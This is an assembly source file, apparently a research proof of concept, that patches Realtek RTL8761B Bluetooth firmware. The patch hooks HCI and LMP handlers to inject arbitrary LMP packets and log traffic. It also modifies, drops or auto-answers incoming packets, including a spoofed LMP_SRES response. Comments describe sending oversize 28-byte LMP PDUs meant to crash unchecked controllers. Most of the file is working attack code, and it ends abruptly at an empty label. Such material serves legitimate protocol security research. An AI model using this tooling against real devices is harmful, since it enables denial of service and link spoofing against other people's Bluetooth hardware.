# Xeno Kovah - Dark Mentor LLC - https://darkmentor.com
# Copyright (c) Dark Mentor LLC 2025
# PoC code to patch Realtek RTL8761B firmware
# Assembled bytes to be extracted and used with _RTL8761B_USB_Windows_usbbluetooth_Patch_Download* python script
# Compile with: mipsel-linux-gnu-as -mips32r2 -mips16 -o RTL8761B_patch_modification.o RTL8761B_patch_modification.asm
# Disassemble with: mipsel-linux-gnu-objdump -mips16 -EL -d RTL8761B_patch_modification.o
# Extract bytes with: python3 ./print_hex_bytes.py

# IMPORTANT NOTE TO SELF!: JALRC DOESN'T WORK! (Even though jrc does!)

        .set    noreorder
        .set    mips16
        .text
        .global _start_install_fptrs

# Reached via first-function-in-patches inline prolog hook
_start_install_fptrs:
	# HCI CMD hook
.align 2				# If I don't add these, it seems to not keep from generating invalid lw
        lw      $v1, patch_target_1	# Load up the location where to read/write fptr for HCI CMD hook
	lw	$a0, 0($v1)		# Dereference the address, to get the existing pointer (should be 0x80014181)
.align 2
	lw	$v0, backup_addr_1	# Load up the backup location
        sw      $a0, 0($v0)		# Store original fptr to backup, to call into original later
.align 2
	la      $v0, _installed_fptr_1	# Get the address we want to use to replace the previous fptr (pseudo-instruction)
	sw	$v0, 0($v1)		# Write our fptr so it gets called in all HCI CMD control flow

	# LMP hook
.align 2				# If I don't add these, it seems to not keep from generating invalid lw
        lw      $v1, patch_target_2	# Load up the location where to read/write fptr for LMP hook
	lw	$a0, 0($v1)		# Dereference the address, to get the existing pointer (should be 0x8010dfb1 for the 0xd922 patch, for USB/RTL8761BUV chip)
.align 2
	lw	$v0, backup_addr_2	# Load up the backup location
        sw      $a0, 0($v0)		# Store original fptr to backup, to call into original later
.align 2
	la      $v0, _installed_fptr_2	# Get the address we want to use to replace the previous fptr (pseudo-instruction)
	sw	$v0, 0($v1)		# Write our fptr so it gets called in all LMP control flow

	# Initialize mod_flag and mod_table to 0 (RAM may contain garbage on first boot)
.align 2
	lw	$v0, mod_flag_addr	# Load mod_flag address
	li	$v1, 0x00
	sb	$v1, 0($v0)		# Clear mod_flag to 0 (passthrough mode)
.align 2
	lw	$v0, mod_table_addr	# Load mod_table address
	sw	$v1, 0($v0)		# Clear first 4 bytes of mod_table

	# Hook 3 (tLC_TX) is installed by the Patch Writer AFTER firmware download
	# because DAT_8010DAA0 is in the patch area and gets overwritten during download.
	# The ASM shim _installed_fptr_3 is included here but activated from Python.

_resume_original_control_flow:
	# Now that this is an epilog hook, we don't need a resume target anymore
	# We just conclude how the original code would have concluded...

	# These were the original instructions I smashed...
	# AFAICT the original code doesn't care about the return values in v0/v1...
	lw	$a3, 0x24($sp)		# Shows up in Ghidra as "local_4" aka -4, so 0x24 is calculated by 0x28 stack size (from addiu sp, -0x28) - 4
	lw	$s1, 0x20($sp)		# 0x28 stack size - 0x8
	lw	$s0, 0x1C($sp)		# 0x28 stack size - 0xC
.align 2
	jr	$a3			# Jump to the saved return/continue address
	addiu	$sp, 0x28		# Restore the stack pointer to remove the stack frame

# Reached via function pointer call where the global data storing the fptr was overwritten with this address
# This code is called on all HCI CMD control flow,
# and will check whether our VSC (0xFE22, OCF = 0x222) was passed
_installed_fptr_1:
	# Store arguments as backup on stack
	addiu	$sp, -0x20		# All other instances of addiu $sp, -X that I saw int the code were 0x8-aligned,
					# so I'm doing that here too out of an abundance of caution for possible alignment requirements
	sw	$a0, 0x00($sp)
	sw	$a1, 0x04($sp)
	sw	$a2, 0x08($sp)
	sw	$ra, 0x0C($sp)

	# At this point $a0 should hold a pointer to the buffer with the OGF_OCF at offset 0, len at offset 2, and data at offset 3
.align 2
	lhu	$v1, 0x0($a0)		# Store the OGF_OCF into $v1 (make sure to use *unsigned* LHU to avoid sign-extension!)
	cmpi	$v1, 0xfe22		# Check if it's our VSC (OCF = 0x222, unused by RTK AFAIK)
.align 2
	btnez	not_my_VSC

	# Save regs again, just in case...
	addiu	$sp, -0x20		# All other instances of addiu $sp, -X that I saw int the code were 0x8-aligned,
					# so I'm doing that here too out of an abundance of caution for possible alignment requirements
	sw	$a0, 0x04($sp)
	sw	$a1, 0x08($sp)
	sw	$a2, 0x0C($sp)
	sw	$a3, 0x10($sp)
	sw	$v0, 0x14($sp)
	sw	$v1, 0x18($sp)

	# PATCHED: Read connection index from VSC payload byte 3 and save it
	# New VSC 0xFE22 format: [OGF_OCF:2B] [total_len:1B] [conn_index:1B] [lmp_data:NB]
	lbu	$v1, 0x03($a0)		# Read connection index from HCI buffer byte 3
	sw	$v1, 0x1C($sp)		# Save conn_index to unused stack slot 0x1C

	# Call the existing code's memcpy() to copy the LMP data out of the HCI buf and into the LMP buf
	lbu	$a2, 0x02($a0)		# Load the total data length into a2
	addiu	$a2, -1			# Subtract 1 for the conn_index byte = LMP data length
	move	$a1, $a0		# Load the src base address from a0 into a1
	addiu	$a1, 0x04		# LMP data starts at offset 4 (was 3, now skipping conn_index byte)
.align	2
	la      $a0, LMP_pkt_buf	# Load the dst into a0
.align	2
	lw	$v0, memcpy_addr	# Get address of function to call
	jalr	$v0                     # Jump with link, so it comes back here when done
	nop
	# Restore saved reg that we depend on (pointer to the HCI buffer)
	lw	$a0, 0x04($sp)

#TMP: MOVE ME BACK!
	# Send a HCI Vendor-specific event (0xFF) from Controller to Host
	# with a the data which is destined to be used for LMP packet sending, just to prove we're running the patched code and we got here
	# (Using this instead of a type 0x0F or 0x0E just makes Bumble ignore it, instead of getting its state machine confused.)
        # Call hci_evt_sender(0xff, &LMP_pkt_buf, <dynamic-size>)
	lbu	$a2, 0x02($a0)		# Load total data length from HCI buffer
	addiu	$a2, -1			# Subtract 1 for conn_index byte = LMP data size for echo
	li      $a0, 0xff		# Set the first arg to constant for HCI Event opcode
.align	2
	la      $a1, LMP_pkt_buf	# We're going to check back the LMP_pkt_buf contents
.align	2
	lw	$v0, hci_evt_sender_addr # Get address of function to call
	jalr	$v0                     # Jump with link, so it comes back here when done
	nop

# Call send_LMP_reply(	a0=0 (big_ol_struct-array index 0),
#			a1=ptr to LMP buffer (opcode as offset 0 of a ushort (so it can hold extended opcodes if need be))
#			a2=0x11 (len = 17 bytes, full BT spec max LMP PDU),
#			a4=3 (unknown meaning! always either 2 or 3, possibly something to do with originating or replying),
#			a5=0x64 (unknown meaning!), store at SP + 0x10 (based on observed behavior in send_LMP_FEATURES_REQ_or_RES and others)
#			a6=0 (unknown meaning!), store at SP + 0x14 (based on observed behavior in send_LMP_FEATURES_REQ_or_RES and others)
	lw	$a0, 0x1C($sp)		# PATCHED: Load connection index from saved stack slot (was: li $a0, 0)
.align	2
	la      $a1, LMP_pkt_buf	# Set the second arg to address of the LMP_pkt_buf buffer with the data to be sent
	li	$a2, 0x1c		# PATCHED: 28 bytes max (was 0x11/17). Oversize for BrakTooth-style fuzzing.
					# BT spec max is 17 but targets may not validate. >17 byte PDUs crash some controllers.
	# TID control: $a3 = 3 (default). Host can change via RAM write to the
	# 'li $a3, N' instruction byte at runtime (same approach as connection index).
	# Write 2 to flip TID, write 3 for normal.
	li	$a3, 3			# Default TID value (host patches this byte via VSC 0xFC62)
	# Make guaranteed space on the stack for args[4],[5]
	# I always saw extra space allocated (but not used) for args[0]-[3], so I'm doing the same
.align	2
	addiu	$sp, -0x18		# Allocate 0x18 bytes of stack space
	li	$v0, 0x64		# Load hardcoded value always used with 0x27 LMP_FEATURES_REQ (TODO: If other packets don't work, check this!)
	sw	$v0, 0x10($sp)		# Store this args[4] at SP+0x10 (as was seen in existing code)
	li	$v0, 0			# Load hardcoded value always used with 0x27 LMP_FEATURES_REQ (TODO: If other packets don't work, check this!)
	sw	$v0, 0x14($sp)		# Store this args[5] at SP+0x14 (as was seen in existing code)
.align 2
	lw	$v0, send_LMP_reply_addr# Get address of function to call
	jalr    $v0                     # Jump with link, so it comes back here when done
	nop

	# Remove space on the stack for args[4],[5]
.align	2
	addiu	$sp, 0x18

	# Restore regs after just in case save
	lw	$a0, 0x04($sp)
	lw	$a1, 0x08($sp)
	lw	$a2, 0x0C($sp)
	lw	$a3, 0x10($sp)
	lw	$v0, 0x14($sp)
	lw	$v1, 0x18($sp)
	addiu	$sp, 0x20

# This is the label where it will go on any VSC except 0xFE22
not_my_VSC:

	# Restore arguments from backups
	lw	$a1, 0x0C($sp)		# Restore my $ra backup...
	move	$ra, $a1		# ...because it's not possible to encode "lw $ra, 0x0C($sp)" in MIPS16e (despite there being a "sw $ra, <offset>($sp)" form!)
	lw	$a2, 0x08($sp)
	lw	$a1, 0x04($sp)
	lw	$a0, 0x00($sp)
	addiu	$sp, 0x20

	# Call to the original fptr that was in patch_target_1,
	# which we stored to backup_addr_1
.align 2
	lw	$v1, backup_addr_1
	lw	$v1, 0($v1)
	jrc	$v1

# This code is called on the path where incoming LMP packets are parsed
# The purpose of the code is:
# 1) To be used to confirm that a given device has seen or not seen an incoming LMP packet
# 2) To provide inspection capabilities to understand what arguments & buffer contents look like
#    (which can help with creating outgoing LMP capabilities)
_installed_fptr_2:
	# Store arguments as backup on stack

# Very very weird that if this alignment statement isn't here, patching fails...
.align 2
	addiu	$sp, -0x20		# All other instances of addiu $sp, -X that I saw int the code were 0x8-aligned,
					# so I'm doing that here too out of an abundance of caution for possible alignment requirements
	sw	$a0, 0x00($sp)
	sw	$a1, 0x04($sp)
	sw	$a2, 0x08($sp)
	sw	$s0, 0x0C($sp)
	sw	$s1, 0x10($sp)
	sw	$ra, 0x14($sp)		# It's OK to "sw $ra, offset($sp)", but be aware there's not a way to encode "lw $ra, offset($sp)"...


	# I don't know what I'm currently screwing up...but without this extra save/restore before/after function call, it behaves crazily...
	addiu	$sp, -0x10		# Assuming 0x8-alignment is required, because it was seen elsewhere

	sw	$a0, 0x00($sp)
	sw	$a1, 0x04($sp)
	sw	$a2, 0x08($sp)
	sw	$v0, 0x0C($sp)

	# Always memset() hci_evt_packet_log_buf to 0 for clarity before copying data in
	# (Should I try setting it to something like X to see uninitialized data?)
	li	$a2, 0x38		# Size of hci_evt_packet_log_buf
	li	$a1, 0xcc		# Value to memset to
.align	2
	la	$a0, hci_evt_packet_log_buf
.align	2
	lw	$v0, memset_addr	# Get address of function to call
	jalr	$v0                     # Jump with link, so it comes back here when done
	nop

	lw	$v0, 0x0C($sp)
	lw	$a2, 0x08($sp)
	lw	$a1, 0x04($sp)
	lw	$a0, 0x00($sp)
	addiu	$sp, 0x10

	# Copy data from the incoming LMP packet to the the hci_evt_packet_log_buf that we will send with HCI Event
	# a0 has some data structure (e.g. data_buf_pointer, unknown-arg2 (used as byte in 0x480 opcode-like), ushort-opcode-like)
.align 2
	la	$v0, hci_evt_packet_log_buf

.align 2
	lw	$v1, AAAA
	sw	$v1, 0x00($v0)		# Writing 'A's to the beginning, just so it's clear where the data starts in the buffer
	sw	$a0, 0x04($v0)		# Write the a0 pointer itself
	lw	$v1, 0x00($a0)		# Read data_buf_pointer
	sw	$v1, 0x08($v0)		# Store data_buf_pointer
	lw	$v1, 0x04($a0)		# Read the unknown-arg2 at offset 4
	sw	$v1, 0x0C($v0)		# Storing unknown-arg2 at previous store +4
	lh	$v1, 0x08($a0)		# Read the opcode-like ushort and 2 bytes more at offset 8
	sh	$v1, 0x10($v0)		# Storing at previous store +4
.align 2
	lw	$v1, BBBB
	sw	$v1, 0x14($v0)		# Writing 'B's to the end, just so it's clear where the data ends in the buffer

	# Save the a0 in s0 as a tmp, before it gets smashed again below
	move	$s0, $a0

	# PATCHED: Log ALL incoming LMP opcodes, not just 0x0480 path
	# Previously filtered to only collect payload when opcode-like == 0x0480
	# Now we always fall through to extra_data_collection for full visibility
.align 2
	lh	$v1, 0x10($v0)		# Load the opcode-like back into v1 (kept for log buffer at 0x10)
	nop				# Was: cmpi $v1, 0x0480
	nop				# Was: (alignment)
.align 2
	nop				# Was: btnez skip_extra_data_collection

	# The maximum possible size of an LMP packet according to Table 5.1 "Coding of the different LM PDUs" in Spec v 5.4
	# is 17 bytes, which includes the opcode. Since we're also trying to copy the 4-byte header (but getting 0s)
	# we'll copy 0x18 bytes (to be aligned) from the data_buf_pointer
	# Now copy 0x20 bytes of data from the data_buf_pointer (so I can see what the function would be seeing for various vars)
.align 2
	lw	$a0, 0x08($v0)		# Store data_buf_pointer into a0
	lw	$v1, 0x00($a0)		# Strangely this is always coming back as 0x00000000 instead of the first 4 bytes of LMP ACH header...
	sw	$v1, 0x18($v0)
	lw	$v1, 0x04($a0)
	sw	$v1, 0x1C($v0)
	lw	$v1, 0x08($a0)
	sw	$v1, 0x20($v0)
	lw	$v1, 0x0C($a0)
	sw	$v1, 0x24($v0)
	lw	$v1, 0x10($a0)
	sw	$v1, 0x28($v0)
	lw	$v1, 0x14($a0)
	sw	$v1, 0x2C($v0)
	lw	$v1, 0x18($a0)
	sw	$v1, 0x30($v0)
.align 2
	lw	$v1, CCCC
	sw	$v1, 0x34($v0)		# Writing 'C's to the end, just so it's clear where the data ends in the buffer

skip_extra_data_collection:

	# I don't know what I'm currently screwing up...but without this extra save/restore before/after function call, it crashes
	addiu	$sp, -0x10		# All other instances of addiu $sp, -X that I saw int the code were 0x8-aligned,
					# so I'm doing that here too out of an abundance of caution for possible alignment requirements
	sw	$a0, 0x00($sp)
	sw	$a1, 0x04($sp)
	sw	$a2, 0x08($sp)
	sw	$v0, 0x0C($sp)

	# Send a HCI vendor-specific event (0xFF) from Controller to Host
	# with a custom buffer hci_evt_packet_log_buf worth of data
        # Call hci_evt_sender(0xff, &hci_evt_packet_log_buf, 0x40)
	li      $a0, 0xff			# Set the first arg to constant for HCI Event opcode
.align	2
	la      $a1, hci_evt_packet_log_buf	# Set the second arg to address of the hci_evt_packet_log_buf buffer with the HCI Event data
	li      $a2, 0x38			# Set the third arg to the size of the hci_evt_packet_log_buf
.align 	2
	lw      $v0, hci_evt_sender_addr	# Get address of function to call
	jalr    $v0                     	# Jump with link, so it comes back here when done
	nop

	# I don't know what I'm currently screwing up...but without this extra save/restore before/after function call, it crashes
	lw	$v0, 0x0C($sp)
	lw	$a2, 0x08($sp)
	lw	$a1, 0x04($sp)
	lw	$a0, 0x00($sp)
	addiu	$sp, 0x10

	# Restore extra-saved a0
	move	$a0, $s0

	# Restore arguments from backups
	lw	$s1, 0x14($sp)		# Restore my $ra backup...
	move	$ra, $s1		# ...since there's no "lw $ra ..." options
	lw	$a0, 0x00($sp)
	lw	$a1, 0x04($sp)
	lw	$a2, 0x08($sp)
	lw	$s0, 0x0C($sp)
	lw	$s1, 0x10($sp)
.align 2
	addiu	$sp, 0x20		# All other instances of addiu $sp, -X that I saw int the code were 0x8-aligned,
					# so I'm doing that here too out of an abundance of caution for possible alignment requirements

	# PATCHED: In-flight LMP modification before calling original handler
	# mod_flag at 0x80133FF0:
	#   0x00 = passthrough (default)
	#   0x01 = modify one-shot (modify data_buf then auto-clear to 0)
	#   0x02 = drop one-shot (swallow packet, auto-clear to 0)
	#   0x03 = opcode-selective drop (drop only if opcode matches mod_table[2], one-shot)
	#   0x04 = persistent modify (same as 0x01 but does NOT auto-clear)
	#   0x05 = auto-respond (detect trigger opcode → send pre-loaded LMP response, one-shot)
	# mod_table at 0x80133FE0: [byte_offset:1B] [new_value:1B] [target_opcode:1B]
	# auto_response buffer at 0x80133FC0 (17 bytes: opcode + params)
	# auto_response trigger at 0x80133FD8 (1 byte: opcode to match)
	# auto_response conn at 0x80133FD9 (1 byte: connection index for response)
.align 2
	lw	$v0, mod_flag_addr	# Load address of mod_flag
	lbu	$v1, 0($v0)		# Read the mode byte
	cmpi	$v1, 0x00		# Check if passthrough (mode 0)
	bteqz	lmp_call_original	# If 0, skip straight to original handler

	# Check for DROP mode (mode == 2)
	cmpi	$v1, 0x02
	bteqz	lmp_drop_packet		# If mode == 2, drop the packet

	# Check for OPCODE-SELECTIVE DROP (mode == 3)
	cmpi	$v1, 0x03
	bteqz	lmp_opcode_drop		# If mode == 3, check opcode match

	# Check for AUTO-RESPOND (mode == 5)
	cmpi	$v1, 0x05
	bteqz	lmp_auto_respond	# If mode == 5, check trigger and send response

	# Mode 1 or 4: Modify data buffer, then call original handler
	# Read modification params from mod_table at 0x80133FE0
	lw	$v1, mod_table_addr	# v1 = &mod_table
	lbu	$a2, 0($v1)		# a2 = byte_offset into data buffer
	lbu	$a3, 1($v1)		# a3 = new_value to write
	# Get data_buf_pointer from the struct at $a0
	lw	$v0, 0x00($a0)		# v0 = data_buf_pointer
	addu	$v0, $v0, $a2		# v0 = &data_buf[byte_offset]
	sb	$a3, 0($v0)		# Write new_value at that offset
	# Check if one-shot (mode 1) or persistent (mode 4)
.align 2
	lw	$v0, mod_flag_addr
	lbu	$v1, 0($v0)
	cmpi	$v1, 0x04		# Mode 4 = persistent, don't clear
	bteqz	lmp_call_original	# If persistent, skip clearing
	# One-shot: clear mod_flag back to 0x00
	li	$v1, 0x00
	sb	$v1, 0($v0)		# Clear flag — falls through to call_original

lmp_call_original:
	# Call to the original fptr that was in patch_target_2,
	# which we stored to backup_addr_2
	nop				# Alignment padding for PC-relative lw
	lw	$v1, backup_addr_2
	lw	$v1, 0($v1)
	jrc	$v1

lmp_drop_packet:
	# Drop: don't call original handler, just return to caller
	# One-shot: clear mod_flag
	nop				# Alignment padding for PC-relative lw
	lw	$v0, mod_flag_addr
	li	$v1, 0x00
	sb	$v1, 0($v0)		# Clear flag (one-shot)
	jr	$ra
	nop

lmp_opcode_drop:
	# Mode 3: Opcode-selective drop — only drop if incoming opcode matches target
	# mod_table[2] = target opcode (raw, not encoded)
	# If match: drop packet + clear flag. If no match: passthrough.
	lw	$v1, mod_table_addr
	lbu	$a2, 2($v1)		# a2 = target opcode from mod_table[2]
	# Read incoming LMP opcode from data_buf
	lw	$v0, 0x00($a0)		# v0 = data_buf_pointer
	lbu	$v1, 0x04($v0)		# v1 = encoded opcode byte at data_buf[4]
	srl	$v1, $v1, 1		# Decode: opcode = encoded >> 1
	cmp	$v1, $a2		# Compare with target opcode
	btnez	lmp_call_original	# No match → passthrough to original handler
	# Match: drop this packet + one-shot clear
	nop
	lw	$v0, mod_flag_addr
	li	$v1, 0x00
	sb	$v1, 0($v0)
	jr	$ra			# Return without calling original handler
	nop

lmp_auto_respond:
	# Mode 5: Auto-respond — detect trigger opcode, send pre-loaded LMP response
	# Check if incoming opcode matches trigger at 0x80133FD8
	nop
	lw	$v1, auto_resp_trigger_addr
	lbu	$a2, 0($v1)		# a2 = trigger opcode
	lbu	$a3, 1($v1)		# a3 = connection index for response
	# Read incoming LMP opcode
	lw	$v0, 0x00($a0)		# v0 = data_buf_pointer
	lbu	$v1, 0x04($v0)		# v1 = encoded opcode at data_buf[4]
	srl	$v1, $v1, 1		# Decode: opcode = encoded >> 1
	cmp	$v1, $a2		# Compare with trigger opcode
	btnez	lmp_call_original	# No match → passthrough

	# Match: send the pre-loaded response from auto_response_buf
	# Save current $a0 (we need it for the original handler call later)
	addiu	$sp, -0x20
	sw	$a0, 0x00($sp)
	sw	$ra, 0x04($sp)
	sw	$a3, 0x08($sp)		# Save conn_index

	# Call send_LMP_reply(conn_index, &auto_response_buf, 0x1c, a3=3, 0x64, 0)
	lw	$a0, 0x08($sp)		# a0 = conn_index from trigger config
.align 2
	la	$a1, auto_response_buf	# a1 = pre-loaded response buffer
	li	$a2, 0x11		# a2 = 17 bytes (standard LMP max for response)
	li	$a3, 3			# a3 = TID default
	addiu	$sp, -0x18
	li	$v0, 0x64
	sw	$v0, 0x10($sp)
	li	$v0, 0
	sw	$v0, 0x14($sp)
.align 2
	lw	$v0, send_LMP_reply_addr
	jalr	$v0
	nop
	addiu	$sp, 0x18

	# Restore and clear auto-respond flag
	lw	$a0, 0x00($sp)		# Restore original $a0
	lw	$s0, 0x04($sp)
	move	$ra, $s0
	addiu	$sp, 0x20
.align 2
	lw	$v0, mod_flag_addr
	li	$v1, 0x00
	sb	$v1, 0($v0)		# One-shot clear
	# Fall through to call_original (let the controller also process the incoming packet)

# Hook 3: Outgoing packet logging shim (tLC_TX)
# Logs both LMP (0x32E) and ACL data (0x320) via HCI Event 0xFF
_installed_fptr_3:
	addiu	$sp, -0x18
	sw	$a0, 0x00($sp)
	sw	$ra, 0x04($sp)
	sw	$v0, 0x08($sp)
	sw	$v1, 0x0C($sp)

	# param_1 is in $a0 (pointer to message struct)
	# param_1[2] = message type (at offset 8 from $a0)
	lh	$v1, 0x08($a0)		# Read message type
	cmpi	$v1, 0x032e		# Is it LMP send (0x32E)?
	bteqz	fptr3_log_lmp		# Yes → log as LMP

	# Check for ACL data (0x320)
	lh	$v1, 0x08($a0)
	cmpi	$v1, 0x0320		# Is it ACL data (0x320)?
	btnez	fptr3_passthrough	# Neither LMP nor ACL → skip

	# ACL data: log with "ACLX" marker
	# $a0[0] = pointer to ACL data: [handle:12|PB:2|BC:2][length:16][L2CAP data...]
	lw	$v0, 0x00($a0)		# v0 = ACL data pointer
.align 2
	la	$a1, hci_evt_packet_log_buf
.align 2
	lw	$v1, ACL_MARKER		# "ACLX" = 0x584C4341
	sw	$v1, 0x00($a1)
	# Copy first 8 bytes of ACL data (handle + length + first 4 bytes of L2CAP)
	lw	$v1, 0x00($v0)		# handle + length
	sw	$v1, 0x04($a1)
	lw	$v1, 0x04($v0)		# first 4 bytes of L2CAP payload
	sw	$v1, 0x08($a1)
	lw	$v1, 0x08($v0)		# next 4 bytes
	sw	$v1, 0x0C($a1)

	# Send 16 bytes: [ACLX:4B] [handle+len:4B] [l2cap_data:8B]
	li	$a2, 0x10
	li	$a0, 0xff
.align 2
	lw	$v0, hci_evt_sender_addr
	jalr	$v0
	nop
	# Restore and call original handler (same as fptr3_passthrough)
	lw	$v1, 0x0C($sp)
	lw	$v0, 0x08($sp)
	lw	$a0, 0x00($sp)
	lw	$s0, 0x04($sp)
	move	$ra, $s0
	addiu	$sp, 0x18
	nop
	lw	$v1, backup_addr_3
	lw	$v1, 0($v1)
	jrc	$v1

fptr3_log_lmp:

	# It's an outgoing LMP packet. Log it.
	# $a0[0] = pointer to LMP packet struct
	# *($a0[0] + 4) = encoded opcode byte (opcode<<1|TID)
	# *($a0[0] + 5) = first param byte
	# *($a0[0] + 0x18) = length - 1
	# *($a0[0] + 0x19) = connection index
	lw	$v0, 0x00($a0)		# v0 = LMP packet struct pointer

	# Build a small log buffer on the stack
	# We'll send 12 bytes via hci_evt_packet_log_buf:
	# [0x54585858] (TX.. marker) + [conn_idx:1B] [opcode:1B] [param1-6:6B]
	# Use hci_evt_packet_log_buf (already exists) to avoid sb $sp issues
.align 2
	la	$a0, hci_evt_packet_log_buf
	# Write TX marker (0x54585858 = "TXXX")
.align 2
	lw	$v1, TX_MARKER
	sw	$v1, 0x00($a0)
	# Write conn_index + opcode + params from LMP struct ($v0)
	lbu	$v1, 0x19($v0)		# conn_index
	sb	$v1, 0x04($a0)
	lbu	$v1, 0x04($v0)		# encoded opcode (opcode<<1|TID)
	sb	$v1, 0x05($a0)
	lbu	$v1, 0x05($v0)		# param byte 1
	sb	$v1, 0x06($a0)
	lbu	$v1, 0x06($v0)		# param byte 2
	sb	$v1, 0x07($a0)
	lbu	$v1, 0x07($v0)		# param byte 3
	sb	$v1, 0x08($a0)
	lbu	$v1, 0x08($v0)		# param byte 4
	sb	$v1, 0x09($a0)
	lbu	$v1, 0x18($v0)		# length - 1
	sb	$v1, 0x0A($a0)
	lbu	$v1, 0x09($v0)		# param byte 5
	sb	$v1, 0x0B($a0)

	# Send via hci_evt_sender(0xFF, &hci_evt_packet_log_buf, 12)
	li	$a2, 0x0c		# size = 12 bytes
.align 2
	la	$a1, hci_evt_packet_log_buf
	li	$a0, 0xff		# HCI Event opcode
.align 2
	lw	$v0, hci_evt_sender_addr
	jalr	$v0
	nop

fptr3_passthrough:
	# Restore regs and call original tLC_TX handler
	lw	$v1, 0x0C($sp)
	lw	$v0, 0x08($sp)
	lw	$a0, 0x00($sp)		# Restore original $a0 (message struct pointer)
	lw	$s0, 0x04($sp)		# Restore $ra into $s0 (can't lw $ra directly)
	move	$ra, $s0
	addiu	$sp, 0x18
	# Jump to original tLC_TX
	nop
	lw	$v1, backup_addr_3
	lw	$v1, 0($v1)
	jrc	$v1

# Hook 4: Incoming LC packet logging shim (tLC_RX)
# Logs ALL incoming Link Controller messages — covers BLE LL, LMP, ACL, SCO
# Uses "RXLC" marker (0x434C5852) to distinguish from LMP RX hook (AAAA) and TX hook (TXXX)
_installed_fptr_4:
	addiu	$sp, -0x18
	sw	$a0, 0x00($sp)
	sw	$ra, 0x04($sp)
	sw	$v0, 0x08($sp)
	sw	$v1, 0x0C($sp)

	# Log: message type + first 8 bytes of message data
	# param_1 = $a0 (pointer to LC message struct)
	# param_1[0] = first word, param_1[2] = message type (at offset 8)
.align 2
	la	$a1, hci_evt_packet_log_buf
.align 2
	lw	$v1, RXLC_MARKER
	sw	$v1, 0x00($a1)		# RXLC marker
	lh	$v1, 0x08($a0)		# Message type (16-bit at offset 8)
	sh	$v1, 0x04($a1)		# Store msg type
	lw	$v1, 0x00($a0)		# First word of message
	sw	$v1, 0x06($a1)		# Store first word
	lw	$v1, 0x04($a0)		# Second word
	sw	$v1, 0x0A($a1)		# Store second word

	# Send via hci_evt_sender(0xFF, &hci_evt_packet_log_buf, 14)
	li	$a2, 0x0e		# 14 bytes
	li	$a0, 0xff
.align 2
	lw	$v0, hci_evt_sender_addr
	jalr	$v0
	nop

	# Restore and call original tLC_RX
	lw	$v1, 0x0C($sp)
	lw	$v0, 0x08($sp)
	lw	$a0, 0x00($sp)
	lw	$s0, 0x04($sp)
	move	$ra, $s0
	addiu	$sp, 0x18
	nop
	lw	$v1, backup_addr_4
	lw	$v1, 0($v1)
	jrc	$v1

.align 2
patch_target_1:
        .word   0x80120f10		# Hook point in HCI_CMD_OGF_3F__Vendor_Specific__FUN_80030f1c (NULL by default)
patch_target_2:
        .word   0x8012aed4		# The pointer to the function "patch_replaces->assoc_w_tLMP()"
					# which is installed by the patches which replaces the original LMP handler
					# and which I want to replace, so I get called on every LMP packet

backup_addr_1:
	.word	0x80133ffc		# There's a gap at a higher address than where the stack starts, which we can safely assume no one else will use ;)
backup_addr_2:
	.word	0x80133ff8		# There's a gap at a higher address than where the stack starts, which we can safely assume no one else will use ;)
backup_addr_3:
	.word	0x80133ff4		# Stores original tLC_TX handler pointer (assoc_w_tLC_TX = 0x80042421)
backup_addr_4:
	.word	0x80133fec		# Stores original tLC_RX handler pointer (assoc_w_tLC_RX = 0x80042189)
lc_tx_fptr_addr:
	.word	0x8010daa0		# RAM address of DAT_8010DAA0 — function pointer to original tLC_TX in patch area
lc_rx_fptr_addr:
	.word	0x8010da68		# RAM address of tLC_RX function pointer in patch area

memcpy_addr:
	.word	0x8000e85d		# Address of the optimized_memcpy() in Ghidra (+1 for MIPS16e). Used by patches as well, so the address should be stable

memset_addr:
	.word	0x8000e98d		# Address of the memset() in Ghidra (+1 for MIPS16e). Used by patches as well, so the address should be stable

LMP_path_const:
	.word	0x00000480		# The "opcode-like" thing (I don't know what it is) that's checked to go down the LMP control flow path that we care about

mod_flag_addr:
	.word	0x80133ff0		# RAM address of modification mode flag (0=pass, 1=modify, 2=drop)
mod_table_addr:
	.word	0x80133fe0		# RAM address of modification table: [byte_offset:1B] [new_value:1B]

auto_resp_trigger_addr:
	.word	0x80133fd8		# RAM: [trigger_opcode:1B] [conn_index:1B] at 0x80133FD8

send_LMP_reply_addr:
	.word	0x800611e5		# Address for send_LMP_reply() in Ghidra (+1 for MIPS16e)

# This is the buffer structure used by the send_LMP_reply() function in Ghidra
.align 2
LMP_pkt_buf:
	# PATCHED: Extended to 28 bytes for oversize LMP PDU injection (BrakTooth-style)
	# Standard LMP max is 17 bytes. send_LMP_reply() does NOT bounds-check the length.
	# Sending >17 byte PDUs to targets can crash their LMP parsers.
	.byte	0x27			# raw opcode number
	.byte	0x00			# TID/padding byte
	.byte	0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0x13, 0x37	# payload bytes 0-7
	.byte	0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0x13, 0x37	# payload bytes 8-15
	.byte	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00	# EXTENDED: bytes 16-23 (oversize)
	.byte	0x00, 0x00					# EXTENDED: bytes 24-25 (pad to 28)

.align 2
hci_evt_sender_addr:
       .word	0x8001d071                 # Function used to send HCI Events from Controller to Host

# This is a 0x40 byte buffer, just to store 0x40 bytes of data about LMP packets that have been received,
# to send up to the Host for logging/visibility/sanity checking whether the recipient saw
# what we think the sender sent
.align 2
hci_evt_packet_log_buf:
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000
	.word	0x00000000

# Spare vars for misc use
.align 2
AAAA:
	.word	0x41414141
BBBB:
	.word	0x42424242
CCCC:
	.word	0x43434343		# Terminator for my script for printing bytes
# Auto-response pre-loaded LMP PDU buffer (17 bytes)
# Host writes response data here via VSC 0xFC62 at 0x80133FC0 (approximate — actual address computed at runtime)
# For now, this buffer is in the code section. The actual RAM buffer used is at the address
# the assembler places this label.
.align 2
auto_response_buf:
	.byte	0x0C			# Default: LMP_SRES opcode (0x0C)
	.byte	0x00			# TID/padding
	.byte	0x00, 0x00, 0x00, 0x00	# SRES value (4 bytes, host overwrites)
	.byte	0x00, 0x00, 0x00, 0x00	# padding
	.byte	0x00, 0x00, 0x00, 0x00	# padding
	.byte	0x00, 0x00, 0x00	# padding (total 17 bytes)

TX_MARKER:
	.word	0x58585854		# "TXXX" in little-endian — marks outgoing LMP in HCI Event 0xFF
RXLC_MARKER:
